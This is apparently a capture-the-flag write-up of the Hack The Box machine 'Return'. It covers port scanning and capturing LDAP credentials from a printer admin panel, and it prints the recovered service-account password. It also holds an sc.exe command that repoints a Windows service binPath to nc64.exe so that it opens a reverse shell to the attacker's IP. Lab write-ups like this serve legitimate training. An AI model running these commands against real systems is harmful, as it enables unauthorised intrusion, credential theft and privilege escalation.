---
icon: windows
---

# Return - Easy

## <mark style="color:blue;">Gaining Access</mark>

Nmap scan:

```bash
# Nmap TCP
nmap -A -T4 -p- -Pn 10.10.11.108 -oN scans/nmap-tcpall
Starting Nmap 7.95 ( https://nmap.org ) at 2025-10-13 21:36 EDT
Nmap scan report for return.local (10.10.11.108)
Host is up (0.070s latency).
Not shown: 65509 closed tcp ports (reset)
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: HTB Printer Admin Panel
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-10-14 01:56:14Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: return.local0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: return.local0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49671/tcp open  msrpc         Microsoft Windows RPC
49674/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49675/tcp open  msrpc         Microsoft Windows RPC
49679/tcp open  msrpc         Microsoft Windows RPC
49682/tcp open  msrpc         Microsoft Windows RPC
49697/tcp open  msrpc         Microsoft Windows RPC
58605/tcp open  msrpc         Microsoft Windows RPC
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.95%E=4%D=10/13%OT=53%CT=1%CU=40449%PV=Y%DS=2%DC=T%G=Y%TM=68EDA9
OS:A8%P=x86_64-pc-linux-gnu)SEQ(SP=102%GCD=1%ISR=107%TI=I%CI=I%II=I%SS=S%TS
OS:=U)SEQ(SP=102%GCD=1%ISR=10D%TI=I%CI=I%II=I%SS=S%TS=U)SEQ(SP=103%GCD=1%IS
OS:R=10E%TI=I%CI=I%II=I%SS=S%TS=U)SEQ(SP=104%GCD=1%ISR=10B%TI=I%CI=I%II=I%S
OS:S=S%TS=U)SEQ(SP=106%GCD=1%ISR=109%TI=I%CI=I%II=I%SS=S%TS=U)OPS(O1=M542NW
OS:8NNS%O2=M542NW8NNS%O3=M542NW8%O4=M542NW8NNS%O5=M542NW8NNS%O6=M542NNS)WIN
OS:(W1=FFFF%W2=FFFF%W3=FFFF%W4=FFFF%W5=FFFF%W6=FF70)ECN(R=Y%DF=Y%T=80%W=FFF
OS:F%O=M542NW8NNS%CC=Y%Q=)T1(R=Y%DF=Y%T=80%S=O%A=S+%F=AS%RD=0%Q=)T2(R=Y%DF=
OS:Y%T=80%W=0%S=Z%A=S%F=AR%O=%RD=0%Q=)T3(R=Y%DF=Y%T=80%W=0%S=Z%A=O%F=AR%O=%
OS:RD=0%Q=)T4(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=80%W=0
OS:%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R%O=%RD=0%Q=)T7
OS:(R=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=80%IPL=164%UN=
OS:0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=80%CD=Z)

Network Distance: 2 hops
Service Info: Host: PRINTER; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
|_clock-skew: 18m36s
| smb2-time: 
|   date: 2025-10-14T01:57:17
|_  start_date: N/A

TRACEROUTE (using port 143/tcp)
HOP RTT      ADDRESS
1   56.56 ms 10.10.16.1
2   40.54 ms return.local (10.10.11.108)
```

Nmap identified the domain name `return.local` I will add it to `/etc/hosts`

```
10.10.11.108	return.local
```

### <mark style="color:$primary;">DNS Enumeration</mark>

{% code overflow="wrap" %}
```bash
nsenum --dnsserver 10.10.11.108 -f ~/tools/SecLists/Discovery/DNS/bitquark-subdomains-top100000.txt return.local
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (121).png" alt=""><figcaption></figcaption></figure>

Found a new subdomain let's add it to our `/etc/hosts` file

```
10.10.11.108	return.local printer.return.local
```

### <mark style="color:$primary;">HTTP Port 80 TCP</mark>

<figure><img src="../../.gitbook/assets/image (123).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (124).png" alt=""><figcaption></figcaption></figure>

It looks like the password is being populated. Checking the Firefox dev tools, it’s actually pre-filling that field with all `*`, not the password

#### Checking the Request via Burpsuite

When I submit this form, it sends a POST to `/settings.php`. The POST body only has one argument

```
ip=printer.return.local
```

The other three fields from the form are not even sent. I'll change the server Address to my tun0 IP and start a nc listener on port 389. I'll open up Wireshark, when I click Update I see a connection

<figure><img src="../../.gitbook/assets/image (126).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (127).png" alt=""><figcaption></figcaption></figure>

It looks like we caught some credentials for svc-printer! Wireshark confirms it to

<figure><img src="../../.gitbook/assets/image (128).png" alt=""><figcaption></figcaption></figure>

This is an LDAP bindRequest with svc-printer creds

{% code overflow="wrap" %}
```bash
svc-printer:1edFg43012!!
```
{% endcode %}

```bash
netexec winrm return.local -u svc-printer -p '1edFg43012!!' 
```

<figure><img src="../../.gitbook/assets/image (129).png" alt=""><figcaption></figcaption></figure>

This user has winrm access!

## <mark style="color:blue;">Privilege Escalation</mark>

```bash
evil-winrm -i return.local -u svc-printer -p '1edFg43012!!'
```

<figure><img src="../../.gitbook/assets/image (130).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (131).png" alt=""><figcaption></figcaption></figure>

This user is in the Server Operators Group!&#x20;

This only exists on the DC! By default, the group has no members. Server Operators can log on to a server interactively, create and delete network shares, start and stop services, back up and restore files, format the hard disk of the computer, and shut down the computer

### <mark style="color:$primary;">Server Operator Group</mark>

This user can modify, start, and stop services, so I’ll abuse this by having it run nc64.exe to give a reverse shell

I'll Modify the vss service binary BinPath to the netcat binary so that when the service is started again the modified binary would get execute resulting in a reverse shell with admin privileges

{% code overflow="wrap" %}
```powershell
sc.exe config vss binPath="C:\Users\svc-printer\Documents\nc64.exe -e cmd.exe 10.10.16.7 443"
```
{% endcode %}

```powershell
sc.exe stop vss
```

```powershell
sc.exe start vss
```

<figure><img src="../../.gitbook/assets/image (132).png" alt=""><figcaption></figcaption></figure>
